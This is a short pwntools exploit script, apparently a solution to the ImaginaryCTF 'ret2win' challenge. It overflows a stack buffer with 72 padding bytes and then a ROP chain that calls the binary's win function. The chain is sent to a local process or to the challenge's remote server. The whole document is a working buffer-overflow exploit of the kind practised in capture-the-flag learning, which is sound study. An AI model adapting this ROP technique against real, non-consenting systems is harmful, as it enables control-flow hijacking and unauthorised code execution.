from pwn import *

elf = context.binary = ELF('./vuln')


if args.REMOTE:
    # ret2win.chal.imaginaryctf.org 1337
    io = remote('ret2win.chal.imaginaryctf.org', 1337)
else:
    io = process(elf.path)

rop = ROP(elf)

rop.raw(rop.find_gadget(['ret']).address)
rop.call(elf.symbols['win'])

payload = b'A' * 72 + rop.chain()
io.sendline(payload)

print(io.recvall())
